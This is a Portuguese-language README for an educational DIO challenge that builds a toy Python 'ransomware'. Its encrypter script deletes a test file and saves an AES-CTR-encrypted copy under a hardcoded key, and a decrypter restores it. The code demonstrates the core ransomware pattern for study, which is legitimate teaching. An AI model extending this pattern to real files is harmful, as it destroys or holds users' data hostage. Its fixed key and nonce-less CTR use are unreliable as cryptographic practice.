# 🔒 Ransomware em Python – Desafio DIO

Este projeto foi desenvolvido como parte do desafio "Entendendo um Ransomware na Prática com Python".

> ⚠️ **Este código é exclusivamente para fins educacionais e de estudo.**  
> **Nunca utilize este tipo de ferramenta em sistemas reais, sem autorização explícita.**

---

## 🎯 Objetivos

- Implementar um script capaz de **criptografar** um arquivo usando o algoritmo AES.
- Criar um script capaz de **descriptografar** o mesmo arquivo.
- Entender os riscos e mecanismos por trás de ataques de ransomware.

---

## 📁 Estrutura do Projeto

```
.
├── encrypter.py        # Script para criptografar o arquivo
├── decrypter.py        # Script para descriptografar o arquivo
├── teste.txt           # Arquivo de exemplo
└── README.md           # Este arquivo
```

---

## 🛠️ Pré-requisitos

- Python 3.x instalado
- Biblioteca `pyaes` instalada

### Instalação da dependência

```bash
pip install pyaes
```

---

## 🚀 Passo a Passo: Criando seu Projeto Ransomware

### 1. Crie a pasta do projeto

Abra o terminal e execute:

```bash
mkdir cibersecurity-desafio-ransomware
```

> Isso cria uma nova pasta chamada `cibersecurity-desafio-ransomware`.

---

### 2. Entre na pasta

```bash
cd cibersecurity-desafio-ransomware
```

> Agora você está dentro da pasta do seu projeto.

---

### 3. Crie os arquivos necessários

Execute os seguintes comandos para criar os arquivos vazios:

```bash
touch teste.txt
touch encrypter.py
touch decrypter.py
```

> Isso cria três arquivos: `teste.txt`, `encrypter.py` e `decrypter.py`.

---

### 4. Edite os arquivos com o código

#### ➤ Edite o `encrypter.py`

```bash
nano encrypter.py
```

Cole o código abaixo, salve (`Ctrl+O` → Enter) e saia (`Ctrl+X`):

```python
import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Definir a chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

print(f"✅ Arquivo '{file_name}' foi criptografado com sucesso como '{new_file}'.")
```

---

#### ➤ Edite o `decrypter.py`

```bash
nano decrypter.py
```

Cole o código abaixo, salve e saia:

```python
import os
import pyaes

# Abrir o arquivo criptografado
file_name = 'teste.txt.ransomwaretroll'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Definir a chave de descriptografia (deve ser a mesma usada na criptografia)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Descriptografar o arquivo
decrypt_data = aes.decrypt(file_data)

# Remover o arquivo criptografado
os.remove(file_name)

# Criar o arquivo descriptografado
new_file = 'teste.txt'
new_file = open(f'{new_file}', 'wb')
new_file.write(decrypt_data)
new_file.close()

print(f"✅ Arquivo '{file_name}' foi descriptografado com sucesso como '{new_file}'.")
```

---

#### ➤ Crie o conteúdo do `teste.txt`

```bash
echo "alo brasil" > teste.txt
```

> Isso preenche o arquivo `teste.txt` com o texto “alo brasil”.

---

### 5. Instale a biblioteca `pyaes`

No terminal, ainda dentro da pasta do projeto, execute:

```bash
pip install pyaes
```

> Isso instala a biblioteca necessária para a criptografia AES.

---

### 6. Teste os scripts

Execute os scripts na ordem:

```bash
python encrypter.py
python decrypter.py
```

> Você verá mensagens de sucesso e o arquivo `teste.txt` será restaurado.

---

## 📌 Observações Importantes

- A chave usada é: `b"testeransomwares"` (16 bytes).
- O modo de operação é **AES-CTR**.
- Este projeto é **apenas para aprendizado** — não é um ransomware real.
